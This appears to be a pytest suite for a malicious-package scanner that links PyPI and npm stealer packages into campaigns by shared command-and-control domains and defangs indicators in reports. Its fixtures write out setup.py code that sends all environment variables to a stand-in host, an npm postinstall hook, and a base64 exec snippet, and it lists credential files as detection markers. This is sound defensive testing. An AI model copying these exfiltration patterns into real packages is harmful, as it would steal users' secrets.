from __future__ import annotations

import json

import pytest

from corpus import generate
from mpd import cli
from mpd.analyzers import yara_scan
from mpd.campaigns import cluster, common_indicators, linking_iocs, render_markdown, update_db
from mpd.report import to_json, to_markdown
from mpd.scanner import scan_package
from tests.conftest import make_pkg, rule_ids


def _stealer(name, host, eco="pypi", extra=""):
    if eco == "pypi":
        files = {"setup.py": f'from setuptools import setup\nimport os, urllib.request\n{extra}\n'
                             f'urllib.request.urlopen("http://{host}/c", str(dict(os.environ)).encode())\nsetup(name="{name}")\n'}
    else:
        files = {"package.json": f'{{"name":"{name}","version":"1.0.0","scripts":{{"postinstall":"node i.js"}}}}',
                 "i.js": f"const https=require('https');https.request({{hostname:'{host}'}});JSON.stringify(process.env);"}
    return scan_package(make_pkg(files, eco, name=name))


def test_shared_c2_links_packages_across_ecosystems(tmp_path):
    a = _stealer("alpha-one", "c2.shared.example")
    b = _stealer("beta-two", "c2.shared.example", "npm")
    c = _stealer("gamma-three", "other.example")
    groups = cluster([a, b, c])
    sizes = sorted(len(g) for g in groups)
    assert sizes == [1, 2]
    db = update_db(tmp_path / "db.json", [a, b, c])
    linked = [c for c in db.values() if len(c.packages) == 2][0]
    assert linked.ecosystems == ["npm", "pypi"]
    assert "domain|c2.shared.example" in linked.iocs
    assert "defanged" in render_markdown(linked).lower() and "c2[.]shared[.]example" in render_markdown(linked)


def test_database_merges_and_preserves_first_seen(tmp_path):
    db_path = tmp_path / "db.json"
    first = update_db(db_path, [_stealer("alpha-one", "c2.shared.example")])
    cid = next(iter(first))
    first_seen = first[cid].first_seen
    second = update_db(db_path, [_stealer("beta-two", "c2.shared.example", "npm")])
    assert cid in second and len(second[cid].packages) == 2
    assert second[cid].first_seen == first_seen
    assert json.loads(db_path.read_text())["campaigns"][cid]["packages"]


def test_common_infrastructure_does_not_create_a_campaign():
    results = [_stealer(f"pkg-{i}", "cdn.everywhere.example") for i in range(12)]
    assert ("domain", "cdn.everywhere.example") in common_indicators(results)
    assert cluster(results) == []


def test_benign_packages_are_never_clustered():
    benign = scan_package(make_pkg({"pkg/__init__.py": "import requests\nrequests.get('http://c2.shared.example')\n"}))
    assert benign.verdict == "benign"
    assert cluster([benign, _stealer("alpha-one", "c2.shared.example")]) == [[r for r in cluster([benign, _stealer('alpha-one', 'c2.shared.example')])[0]]]


def test_report_defangs_iocs_and_json_is_valid():
    r = _stealer("alpha-one", "c2.shared.example")
    md = to_markdown(r)
    assert "c2[.]shared[.]example" in md and "http://c2.shared.example" not in md
    assert json.loads(to_json(r))["verdict"] == r.verdict


def test_cli_scan_exit_codes_and_demo(tmp_path, capsys):
    out = tmp_path / "demo"
    assert cli.main(["demo", str(out)]) == 0
    mal = next(p for p in (out / "pypi").iterdir() if "d1_setup_env_exfil" in p.name)
    assert cli.main(["scan", str(mal)]) == 2
    capsys.readouterr()                                   # discard the Markdown report
    assert cli.main(["scan", str(mal), "--json"]) == 2
    assert json.loads(capsys.readouterr().out)["verdict"] == "malicious"
    assert cli.main(["scan", str(tmp_path / "missing")]) == 3


@pytest.mark.skipif(not yara_scan.available(), reason="yara-python not installed")
def test_yara_rules_compile_and_fire():
    r = scan_package(make_pkg({"pkg/__init__.py": 'import base64\nexec(base64.b64decode("QUJD"))\n'}))
    assert any(i.startswith("YARA-MPD_py_exec_of_decoded") for i in rule_ids(r))
    ok = scan_package(make_pkg({"pkg/__init__.py": "x = 1\n"}))
    assert not any(i.startswith("YARA-") for i in rule_ids(ok))


def test_yara_layer_degrades_gracefully_when_unavailable(monkeypatch):
    monkeypatch.setattr(yara_scan, "yara", None)
    yara_scan._rules.cache_clear()
    r = scan_package(make_pkg({"pkg/__init__.py": "x = 1\n"}))
    assert any("yara-python not installed" in n for n in r.notes)
    yara_scan._rules.cache_clear()


def test_python_prefilter_covers_every_sink_and_sensitive_marker():
    """The prefilter may only skip files in which NO rule can fire; every sink must be listed."""
    from mpd.analyzers import python_ast as pa
    for name in (pa.CODE_EXEC_SINKS | pa.SHELL_SINKS | pa.RECON_FUNCS):
        assert pa._TRIGGERS.search(name), name
    for marker in ("~/.ssh/id_rsa", ".aws/credentials", ".npmrc", "crontab -", ".bashrc", "os.environ", "os.getenv"):
        assert pa._TRIGGERS.search(marker), marker
